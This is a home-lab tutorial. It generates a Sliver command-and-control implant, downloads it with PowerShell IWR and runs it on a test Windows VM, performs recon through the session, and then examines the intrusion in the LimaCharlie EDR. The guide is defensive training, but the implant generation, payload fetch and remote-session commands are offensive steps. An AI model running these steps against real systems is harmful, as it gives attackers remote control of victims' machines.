# Generate the C2 payload
### Ubuntu Server
1. SSH into the Ubuntu server and drop into root shell:
   `sudo su`
2. Change directory to the Sliver directory created earlier:
   `cd /opt/sliver`
3. Launch the Sliver server
   `sliver-server`
   
   ![](https://i.imgur.com/w7MFCCE.png)
4. Generate the C2 session payload, within the Sliver shell.
   `generate --http [Ubuntu_VM_IP] --save /opt/sliver`
   
   ![](https://i.imgur.com/D9MIHge.png)
5. Confirm the new implant configuration:
   `implants`
   
   ![](https://i.imgur.com/ZquXU2X.png)
6. Exit Sliver by using `exit` command, and drop the C2 payload to the Windows VM by creating a temporary web server with Python.
   `cd /opt/sliver`
   `python3 -m http.server 80`
### Windows VM
1. Launch Administrative Powershell, and run the following command
   ```
   IWR -Uri http://[Ubuntu_VM_IP]/[payload_name].exe -OutFile C:\Users\User\Downloads\[payload_name].exe
	```
	*the payload name is the unique name generated by Sliver, in my case it was COMBATIVE_SHEET*
2. Create a snapshot before executing the malware.
   
   ![](https://i.imgur.com/HpjnKZa.png)
# Start the Command & Control Session
### Ubuntu Server
1. Terminate the Python web server.
   `Ctrl+C`
2. Relaunch sliver
   `sliver-server`
3. Start the Sliver HTTP listener
   `http`
   
   ![](https://i.imgur.com/STD1HdB.png)
### Windows VM
1. Execute the C2 payload download via the Administrative Powershell
   `C:\Users\User\Downloads\<c2_payload>.exe`
### Ubuntu Server
1. Back on the Sliver Session, there should be a session check show up as shown
   
   ![](https://i.imgur.com/HteQP4S.png)
2. Verify the session in Sliver and note down the Session ID
   `sessions`
   
   ![](https://i.imgur.com/ikiBFgQ.png)
   `Session ID: fd1addb0`
3. Interact with the C2 session by using the following command:
   `use [session_id]`
   
   ![](https://i.imgur.com/TMNkVF9.png)
4. Now, there is direct session to interact with the Windows VM. Now let's run some basic recon commands:
	1. Get basic info about the session:
	   `info`
	   
	   ![](https://i.imgur.com/qN3ByK7.png)
	2. Find out what user and the privileges of the user had
	   `whoami`
	   
	   ![](https://i.imgur.com/KTxqUd1.png)
	   `getprivs`
	   
	   ![](https://i.imgur.com/fRQHpw6.png)
	3. Identify the working directory of the implant
	   `pwd`
	   
	   ![](https://i.imgur.com/JKzDCP9.png)
	4. Examine the network connections on the remote system
	   `netstat
	   
	   ![](https://i.imgur.com/MI34qEv.png)
	   - The highlighted connection is the implant's
	   - rphcp.exe is LimaCharlie's
	5. Identify the running processes
	   `ps -T`
	   
	   ![](https://i.imgur.com/xTSwZ0J.png)![](https://i.imgur.com/yGNOTr6.png)
	   Sliver will highlight the defensive product in Red and its own process in Green. It will also show the Security Product used by the system.

# Observe the EDR Telemetry
### LimaCharlie
1. Go to LimaCharlie web UI, and click on the active Windows sensor.
   
   ![](https://i.imgur.com/BTO0QFS.png)
2. On the right panel, click on "Processes" to examine the processes running on the Windows VM. As shown in the image below, there is one processes that is **Not Signed** *(without the Green Check Mark)*. Therefore, it would be unusual process.
   
   ![](https://i.imgur.com/qeDxf9R.png)
3. The Network Connections can also be viewed by clicking on the three-dots at the side of the process. It will show the IP address, ports, protocols and state of the connection.
   
   ![](https://i.imgur.com/9palrz7.png)
4. By clicking into the "Network" tab on the right panel, we can find search for the Destination IP by using `Ctrl + F` with the destination IP as the keyword and found several processes linked to it.
   
   ![](https://i.imgur.com/o9pjSRh.gif)
5. Next, go to the "File System" on the right panel, and navigate to the path where the implant is running from which can be determined from the "Processes" tab earlier. Then the file hash can be inspected and search on VirusTotal for any matching signature.
   
   ![](https://i.imgur.com/2fsGsfH.gif)
   However, there is no match found for the file hash. Because the payload is just generated on our own and it's not available in the VirusTotal database yet. This would be more suspicious if the file is suspected to be a malware, as VirusTotal have a huge database of malware sample, hence the sample file might be a custom-made malware.
6. Next, go to the "Timeline", and filter the timeline with known Indicator of Compromise (name of the file, IP address of the C2).
   
   ![](https://i.imgur.com/aLp26gT.png)
   As shown above, once the malware is launched it immediately started communicating with the C2 server.
